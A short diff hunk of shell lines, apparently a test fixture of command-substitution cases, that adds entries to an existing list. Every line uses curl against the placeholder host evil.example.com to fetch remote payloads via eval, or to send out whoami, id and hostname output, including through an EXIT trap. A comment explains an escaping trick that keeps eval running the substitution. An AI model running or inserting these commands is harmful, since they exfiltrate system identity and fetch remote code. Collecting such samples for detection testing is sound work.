@@ -9,3 +9,6 @@ STAGE="\\`curl -s http://evil.example.com/stage`"
 eval "PAYLOAD=\`curl -s http://evil.example.com/payload\`"
 trap "curl -s http://evil.example.com/exit -d \`whoami\`" EXIT
 bash -lc "curl -s http://evil.example.com/id -d \`id -u -n\`"
+sh -ce "curl -s http://evil.example.com/host -d \`hostname\`"
+# Five backslashes leave two after the first parse, so eval still runs the substitution.
+eval "SEED=\\\\\`curl -s http://evil.example.com/seed\\\\\`"
